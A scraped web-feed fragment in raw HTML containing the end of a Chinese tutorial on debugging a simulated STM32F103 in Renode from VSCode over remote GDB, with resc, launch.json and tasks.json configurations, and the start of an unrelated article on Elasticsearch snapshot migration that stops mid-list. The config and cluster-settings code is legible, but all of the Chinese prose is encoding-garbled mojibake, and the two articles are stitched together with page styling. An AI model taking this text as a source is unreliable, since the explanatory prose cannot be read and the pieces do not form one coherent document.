<p>âŒ IAR + å®ç‰©æ¿å­ + çƒ§å½•å™¨ + ä¸²å£çº¿ + ç¡¬ä»¶ä¾èµ–  âŒ è°ƒè¯•æ–­ç‚¹å’Œæ­¥è¿›å®Œå…¨ä¾èµ–ç‰©ç†æ¿å­  âŒ ä¸€ä¸ªèŠ¯ç‰‡æ¢å¹³å°å°±è¦é‡è£…ä¸€å †ä¸œè¥¿</p>
<p>é€æ¸èµ°å‘ï¼š</p>
<p>âœ” VSCode + GCCï¼šè½»é‡ç°ä»£åŒ–å¼€å‘ä½“éªŒ  âœ” Renodeï¼šæ¨¡æ‹Ÿ STM32/ESP32 ç­‰è®¾å¤‡ï¼ŒåŒ…å« UARTã€SPIã€I2Cã€GPIOã€DMA  âœ” GDB Remoteï¼šè·¨å¹³å°ã€å¯è¿œç¨‹è°ƒè¯•  âœ” è‡ªåŠ¨åŒ–ã€å¯è„šæœ¬åŒ–</p>
<p>è¿™å¥—æ–¹å¼åœ¨å›½å¤–å…¬å¸éå¸¸å¸¸è§ï¼ŒåŸå› æ˜¯ï¼š</p>
<ul>
<li>æ›´é«˜çš„å¼€å‘æ•ˆç‡</li>
<li>æµ‹è¯•å¯è‡ªåŠ¨åŒ–</li>
<li>CI/CD å¯è·‘ä»¿çœŸ</li>
<li>å¯¹ç¡¬ä»¶ä¾èµ–æ›´ä½</li>
</ul>
<p>è€Œåœ¨å›½å†…è¿˜ä¸å¤ªæ™®åŠï¼Œæ‰€ä»¥æˆ‘è‡ªå·±å®è·µåå†™ä¸‹è¿™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›å¸®åŠ©æ›´å¤šäººã€‚</p>
<p>æ­¥éª¤ï¼š</p>
<ol>
<li>å®‰è£…Renode</li>
<li>é…ç½®Renode(ç¼–è¾‘Renodeçš„è„šæœ¬)</li>
<li>é…ç½®VScode(.vscode/tasks.josn/.vscode/launch.josn)</li>
<li>æµ‹è¯•</li>
</ol>
<p>ç›®æ ‡ï¼š</p>
<ol>
<li>å®ç°ç¼–å†™ä»£ç æ§åˆ¶renodeæ¨¡æ‹Ÿå¤–è®¾å·¥ä½œ</li>
<li>å¯ä»¥ä½¿ç”¨vscodeé…åˆrenodeå¯¹ä»£ç è¿›è¡Œä»¿çœŸ</li>
</ol>
<h3 data-id="heading-1">ğŸ“Œ äºŒã€å®‰è£… Renode</h3>
<p>Renode æä¾›å¤šä¸ªç‰ˆæœ¬ï¼Œä½ åªéœ€è¦é€‰ä¸€ä¸ªèƒ½è·‘çš„ï¼š</p>
<p>èµ„æºä¸‹è½½ï¼š[Renodeçš„githubä»“åº“](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frenode%2Frenode" target="_blank" title="https://github.com/renode/renode" ref="nofollow noopener noreferrer">renode/renode: Renode - Antmicroâ€™s open source simulation and virtual development framework for complex embedded systems</a>)</p>
<h3 data-id="heading-2">æˆ‘çš„é€‰æ‹©ï¼š</h3>
<pre><code class="hljs">renode-latest.linux-portable-dotnet.tar.gz
</code></pre>
<p>ç†ç”±ï¼š</p>
<ul>
<li>è‡ªå¸¦ dotnet runtime</li>
<li>ä¸ä¾èµ–ç³»ç»Ÿçš„ dotnet/mono</li>
<li>å¯åœ¨ OrangePi / Raspberry Pi ä¸Šè¿è¡Œ</li>
</ul>
<p>è§£å‹åç›´æ¥è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">./renode
</code></pre>
<h3 data-id="heading-3">ğŸ“Œ ä¸‰ã€é…ç½®Renode</h3>
<p>å†™ä¸€ä¸ªæœ€åŸºç¡€çš„Renode.rescæ–‡ä»¶(STM32F103)ï¼Œè¿™ä¸ªRenode.rescç›¸å½“äºä½ è¦æ¨¡æ‹ŸMCUçš„é…ç½®è¡¨ï¼ŒRenodeåŠ è½½è¿™ä¸ª.rescï¼Œæ¨¡æ‹Ÿå‡ºä½ æƒ³è¦çš„ç¯å¢ƒ</p>
<p>è¿™æ˜¯æˆ‘æœ€ç»ˆå¯è¿è¡Œçš„ç‰ˆæœ¬ï¼ˆå¯ç›´æ¥ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">using sysbus

mach create <span class="hljs-string">"stm32f103"</span>
machine LoadPlatformDescription @platforms/cpus/stm32f103.repl

<span class="hljs-comment"># åŠ è½½å›ºä»¶ï¼ŒrenodeåŠ è½½orangepiä¸Š.elfæ–‡ä»¶</span>
machine LoadELF @/home/orangepi/object/renode_portable/firmware.elf

<span class="hljs-comment"># æ‰“å¼€ UART2</span>
showAnalyzer sysbus.usart2

<span class="hljs-comment"># å¼€ GDB æœåŠ¡ï¼ˆç«¯å£ 3333ï¼‰ï¼Œè®©vscodeå¯ä»¥ä½¿ç”¨GDBé…åˆrenodeå®ç°å¯è§†åŒ–debug</span>
machine StartGdbServer 3333 <span class="hljs-literal">true</span>


start
</code></pre>
<p>ä½ å¯ä»¥æŠŠå®ƒä¿å­˜ä¸ºï¼š</p>
<pre><code class="hljs">run_stm32.resc
</code></pre>
<h3 data-id="heading-4">ğŸ“Œ å››ã€VSCode è°ƒè¯•é…ç½®</h3>
<p>é…ç½®<strong>launch.json</strong>ï¼Œè¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚</p>
<p>ç›´æ¥è´´å¯è¿è¡Œç‰ˆæœ¬ï¼ˆé€‚ç”¨äº ARM Cortex-M3 / STM32F1ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">{
    <span class="hljs-string">"version"</span>: <span class="hljs-string">"0.2.0"</span>,
    <span class="hljs-string">"configurations"</span>: [
        {
            <span class="hljs-string">"name"</span>: <span class="hljs-string">"Debug STM32F103 on Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"cppdbg"</span>,
            <span class="hljs-string">"request"</span>: <span class="hljs-string">"launch"</span>,

            <span class="hljs-string">"program"</span>: <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build/firmware.elf"</span>,
            <span class="hljs-string">"cwd"</span>: <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>"</span>,

            <span class="hljs-string">"miDebuggerPath"</span>: <span class="hljs-string">"arm-none-eabi-gdb"</span>,
            <span class="hljs-string">"miDebuggerServerAddress"</span>: <span class="hljs-string">"xxx.xxx.xxx.xxx:3333"</span>,

            <span class="hljs-string">"preLaunchTask"</span>: <span class="hljs-string">"Run Renode Remote"</span>,

            <span class="hljs-string">"stopAtEntry"</span>: <span class="hljs-literal">true</span>,

            <span class="hljs-string">"setupCommands"</span>: [
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set pagination off"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set confirm off"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set print pretty on"</span> }
            ],

            <span class="hljs-comment">/* On restart: pause, reload ELF, reset CPU (mimic your manual sequence) */</span>
            <span class="hljs-string">"postRemoteConnectCommands"</span>: [
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor machine Pause"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor cpu Reset"</span> }
            ],

            <span class="hljs-string">"externalConsole"</span>: <span class="hljs-literal">false</span>,

            <span class="hljs-string">"targetArchitecture"</span>: <span class="hljs-string">"arm"</span>
        }
    ]
}
</code></pre>
<p>æ ¸å¿ƒç‚¹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"miDebuggerPath"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"arm-none-eabi-gdb"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"miDebuggerServerAddress"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"xxx.xxx.xxx.xxx:3333"</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>è§£é‡Šï¼š</p>
<ul>
<li>miDebuggerPathï¼šæœ¬æœºè¦ä½¿ç”¨çš„ GDBï¼ˆä½ ç”µè„‘ä¸Šå®‰è£…çš„ï¼‰</li>
<li>miDebuggerServerAddressï¼šè¿œç«¯ Renode çš„ GDB server ç›‘å¬åœ°å€</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"preLaunchTask"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Run Renode Remote"</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>VSCode ä¼šå…ˆæ‰§è¡Œåç§°ä¸º "Run Renode Remote" çš„ä»»åŠ¡ï¼ˆåœ¨ tasks.json é‡Œï¼‰ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"postRemoteConnectCommands"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor machine Pause"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor cpu Reset"</span> <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>è¿™æ˜¯æ•´ä¸ªè°ƒè¯•æµç¨‹çš„çµé­‚ã€‚</p>
<p>é€å¥è§£é‡Šï¼š</p>
<h3 data-id="heading-5">â‘  æš‚åœä»¿çœŸ</h3>
<pre><code class="hljs language-css" lang="css">monitor machine <span class="hljs-attribute">Pause</span>
</code></pre>
<p>é˜²æ­¢ Renode ç»§ç»­è¿è¡Œæ—§å›ºä»¶ã€‚</p>
<h3 data-id="heading-6">â‘¡ åœ¨ Renode å†…é‡æ–°åŠ è½½ ELF</h3>
<pre><code class="hljs language-arduino" lang="arduino">monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf
</code></pre>
<p>åŸå› ï¼š</p>
<ul>
<li>VSCode æ¯æ¬¡ build å®Œæˆæœ¬åœ°æœ‰ä¸€ä¸ª ${workspaceFolder}/build/firmware.elf</li>
<li>ä½†æ˜¯è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ ELF é€šå¸¸åœ¨å¦ä¸€ä¸ªç›®å½•ï¼Œæ¯”å¦‚ /home/orangepi/object/...</li>
<li>é‡æ–°åŠ è½½ ELF å¯ä»¥è®© Renode ä¸æœ€æ–°ç¬¦å·ä¸€è‡´</li>
</ul>
<p>è¿™æ˜¯ <strong>â€œæœ¬åœ° build â†’ scp â†’ è¿œç«¯è‡ªåŠ¨åŠ è½½â€</strong> çš„æœºåˆ¶ã€‚</p>
<h3 data-id="heading-7">â‘¢ é‡ç½® CPUï¼ˆç±»ä¼¼ reset haltï¼‰</h3>
<pre><code class="hljs">monitor cpu Reset
</code></pre>
<p>ç›¸å½“äºï¼š</p>
<ul>
<li>ç¨‹åºä»å¤´å¼€å§‹è¿è¡Œ</li>
<li>ä¸‹ä¸€æ­¥ VSCode ä¼šåœåœ¨ main()</li>
</ul>
<p>è¿™ä¸ªåºåˆ—ç›¸å½“äºæ¨¡æ‹Ÿ FreeRTOS ä¸­çš„ debug resetã€‚</p>
<p><strong>Tasks.jsoné…ç½®</strong></p>
<p>å‡ºäº†launch.json,è¿˜æœ‰tasks.jsonéœ€è¦é…ç½®ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">{
    <span class="hljs-string">"version"</span>: <span class="hljs-string">"2.0.0"</span>,
    <span class="hljs-string">"tasks"</span>: [

        <span class="hljs-regexp">/* === 1. CMake Configure === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"CMake Configure"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"cmake"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"-S"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>"</span>,
                <span class="hljs-string">"-B"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build"</span>,
                <span class="hljs-string">"-DCMAKE_BUILD_TYPE=Debug"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: [<span class="hljs-string">"$gcc"</span>]
        },

        <span class="hljs-regexp">/* === 2. CMake Build === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"CMake Build"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"cmake"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"--build"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build"</span>,
                <span class="hljs-string">"--config"</span>, <span class="hljs-string">"Debug"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"CMake Configure"</span>],
            <span class="hljs-string">"problemMatcher"</span>: [<span class="hljs-string">"$gcc"</span>]
        },

        <span class="hljs-regexp">/* === 3. ä¸Šä¼  ELF === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Upload ELF"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"scp"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build/firmware.elf"</span>,
                <span class="hljs-string">"root@192.168.31.135:/home/orangepi/object/renode_portable/"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"CMake Build"</span>],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

        <span class="hljs-regexp">/* === 4. ä¸Šä¼  RESC === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Upload RESC"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"scp"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/renode/platform.resc"</span>,
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx:/home/orangepi/object/renode_portable/"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

        <span class="hljs-regexp">/* === 5. å…³é—­æ—§ Renode å®ä¾‹ === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Close Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"ssh"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx"</span>,
                <span class="hljs-string">"pkill renode || true"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

        <span class="hljs-regexp">/* === 6. å¯åŠ¨ Renode Remoteï¼ˆåå°ä»»åŠ¡ï¼‰ === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Run Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"ssh"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx"</span>,
                <span class="hljs-string">"/home/orangepi/object/renode_portable/renode /home/orangepi/object/renode_portable/platform.resc"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [
                <span class="hljs-string">"Upload ELF"</span>,
                <span class="hljs-string">"Upload RESC"</span>,
                <span class="hljs-string">"Close Renode Remote"</span>
            ],
            <span class="hljs-string">"isBackground"</span>: true,

            <span class="hljs-string">"problemMatcher"</span>: {
                <span class="hljs-string">"owner"</span>: <span class="hljs-string">"Renode"</span>,
                <span class="hljs-string">"pattern"</span>: [
                    {
                        <span class="hljs-string">"regexp"</span>: <span class="hljs-string">"^(?!.*)"</span>,
                        <span class="hljs-string">"file"</span>: <span class="hljs-number">0</span>,
                        <span class="hljs-string">"line"</span>: <span class="hljs-number">0</span>,
                        <span class="hljs-string">"message"</span>: <span class="hljs-number">0</span>
                    }
                ],
                <span class="hljs-string">"background"</span>: {
                    <span class="hljs-string">"activeOnStart"</span>: true,
                    <span class="hljs-string">"beginsPattern"</span>: <span class="hljs-string">"Renode, version .*"</span>,
                    <span class="hljs-string">"endsPattern"</span>: <span class="hljs-string">".*Loaded SVD.*"</span>
                }
            }
        }
    ]
}
</code></pre>
<h3 data-id="heading-8">æµ‹è¯•</h3>
<p>ä½¿ç”¨vscodeçš„ä¸€é”®debugï¼Œå¯ä»¥çœ‹åˆ°vscodeæ­£å¸¸å’Œrenodeé€šè®¯ï¼Œæ‰“æ–­ç‚¹å’Œuartè¾“å‡ºæ­£å¸¸ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-5ed35b98986b2aeac89fe8df5644a40e_720w.png?source=ccfced1a" alt="img" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1ã€Elasticsearchå¿«ç…§è¿ç§»]]></title>    <link>https://juejin.cn/post/7580988382761025551</link>    <guid>https://juejin.cn/post/7580988382761025551</guid>    <pubDate>2025-12-08T04:16:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761025551" data-draft-id="7580809247736250408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1ã€Elasticsearchå¿«ç…§è¿ç§»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:16:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰å§“ç å†œå¼ å‘˜å¤–"/> <meta itemprop="url" content="https://juejin.cn/user/3808364008836999"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1ã€Elasticsearchå¿«ç…§è¿ç§»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808364008836999/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰å§“ç å†œå¼ å‘˜å¤–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:11.000Z" title="Mon Dec 08 2025 04:16:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯è¯´æ˜</h2>
<p>1ã€æºç«¯æ˜¯AWSã€ç›®æ ‡ç«¯æ˜¯é˜¿é‡Œäº‘<br/>
2ã€æœ€åä¸ªå‰²æ¥ç¯å¢ƒï¼Œå®¢æˆ·èƒ½æ¥å—åœæœºè¿ç§»<br/>
3ã€æºç«¯æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œå¤§æ¦‚3T</p>
<h2 data-id="heading-1">å®˜æ–¹è¿ç§»æ–‡æ¡£</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fes%2Fuse-cases%2Fselect-a-data-migration-solution%3Fspm%3Da2c4g.11186623.help-menu-57736.d_3_1_0.416b7c67ry8Q4z%26scm%3D20140722.H_170095._.OR_help-T_cn~zh-V_1" target="_blank" title="https://help.aliyun.com/zh/es/use-cases/select-a-data-migration-solution?spm=a2c4g.11186623.help-menu-57736.d_3_1_0.416b7c67ry8Q4z&amp;scm=20140722.H_170095._.OR_help-T_cn~zh-V_1" ref="nofollow noopener noreferrer">Elasticsearchè¿ç§»æ–¹æ¡ˆé€‰å–æŒ‡å—_æ£€ç´¢åˆ†ææœåŠ¡ Elasticsearchç‰ˆ(ES)-é˜¿é‡Œäº‘å¸®åŠ©ä¸­å¿ƒ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fes%2Fuse-cases%2Fmigrate-elasticsearch-index-data-from-amazon-opensearch-service-to-alibaba-cloud-elasticsearch%23section-vsd-f3p-fhb" target="_blank" title="https://help.aliyun.com/zh/es/use-cases/migrate-elasticsearch-index-data-from-amazon-opensearch-service-to-alibaba-cloud-elasticsearch#section-vsd-f3p-fhb" ref="nofollow noopener noreferrer">å°†AWSä¸­çš„ESæ•°æ®è¿ç§»åˆ°é˜¿é‡Œäº‘ESä¸­_æ£€ç´¢åˆ†ææœåŠ¡ Elasticsearchç‰ˆ(ES)-é˜¿é‡Œäº‘å¸®åŠ©ä¸­å¿ƒ</a></p>
<h2 data-id="heading-2">ESè¿ç§»æ•´ä½“æµç¨‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca8f596a36814096af5217cd6edee404~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ5aeT56CB5Yac5byg5ZGY5aSW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772513&amp;x-signature=ymPTIJ0vCZz65cXL1SJaJ1f5x%2Fg%3D" alt="ESå¿«ç…§è¿ç§»é—®é¢˜.png" loading="lazy"/></p>
<h2 data-id="heading-3">ä¼˜åŒ–ç›®æ ‡ç«¯ESé…ç½®é¡¹</h2>
<p>ä¿®æ”¹ä¸‹é¢çš„é…ç½®å¯ä»¥æœ‰æ•ˆåŠ é€Ÿå¿«ç…§æ¢å¤çš„é€Ÿåº¦ã€‚</p>
<h4 data-id="heading-4">å¢åŠ æ¢å¤å¸¦å®½</h4>
<pre><code class="hljs language-bash" lang="bash">PUT /_cluster/settings
{
    <span class="hljs-string">"transient"</span>: {
        <span class="hljs-string">"indices.recovery.max_bytes_per_sec"</span>: <span class="hljs-string">"300mb"</span>
    }
}
GET /_cluster/settings?include_defaults=<span class="hljs-literal">true</span>&amp;flat_settings=<span class="hljs-literal">true</span>
</code></pre>
<p>1ã€é™åˆ¶æ¢å¤å¸¦å®½: å°† indices.recovery.max_bytes_per_sec å‚æ•°è®¾ç½®ä¸º 300mbï¼ˆé»˜è®¤æ˜¯40mbï¼‰</p>
<p>2ã€ä¸´æ—¶ç”Ÿæ•ˆ: ä½¿ç”¨ transient é…ç½®ï¼Œé‡å¯åå¤±æ•ˆ</p>
<p>3ã€å½±å“èŒƒå›´: æ§åˆ¶åˆ†ç‰‡æ¢å¤ã€é‡æ–°å¹³è¡¡ç­‰æ“ä½œçš„ç½‘ç»œä¼ è¾“é€Ÿåº¦</p>
<h4 data-id="heading-5">è°ƒæ•´é›†ç¾¤åˆ†ç‰‡åˆ†é…å¹¶å‘åº¦: é…ç½® Elasticsearch é›†ç¾¤ä¸­åˆ†ç‰‡æ¢å¤å’Œåˆ†é…çš„å¹¶å‘æ•°é‡</h4>
<p>é»˜è®¤å€¼æ˜¯4</p>
<pre><code class="hljs language-bash" lang="bash">PUT _cluster/settings
{
  <span class="hljs-string">"persistent"</span>: {
    <span class="hljs-string">"cluster.routing.allocation.node_concurrent_recoveries"</span> : <span class="hljs-string">"16"</span>,
    <span class="hljs-string">"cluster.routing.allocation.node_initial_primaries_recoveries"</span> : <span class="hljs-string">"16"</span>
  }
}
</code></pre>
<p>cluster.routing.allocation.node_concurrent_recoveries:</p>
<ul>
